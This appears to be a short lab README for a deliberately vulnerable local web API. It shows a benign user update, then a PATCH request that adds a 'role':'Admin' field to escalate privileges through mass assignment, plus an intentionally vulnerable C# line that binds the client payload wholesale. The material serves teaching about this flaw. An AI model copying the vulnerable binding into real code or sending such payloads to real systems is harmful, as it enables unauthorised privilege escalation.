## Getting user details

Retrieve user JSON:

```bash
curl -s http://localhost:5182/users/1 | jq
```

---

## Benign user details update

Safe update (no role elevation):

```bash
curl -s -X PATCH http://localhost:5182/users/1 \
  -H "Content-Type: application/json" \
  -d '{"Id":1,"FullName":"Alice L. Example","Username":"alice","Email":"alice@example.test"}' \
  | jq
```

---

## Malicious user details update (example)

Example of a request that attempts privilege escalation by adding `role: "Admin"`:

```bash
curl -s -X PATCH http://localhost:5182/users/1 \
  -H "Content-Type: application/json" \
  -d '{"Id":1,"FullName":"Alice L. Example","Username":"alice","Email":"alice@example.test", "role":"Admin"}' \
  | jq
```

---

## Vulnerable code (highlight)

```csharp
// Intentionally vulnerable: binds straight to User entity and marks all fields Modified
_db.Entry(dto).State = EntityState.Modified;
```

**Why this is dangerous:** it blindly trusts client payload and updates every column — allows elevation (e.g., `role`) and unexpected data changes.

---

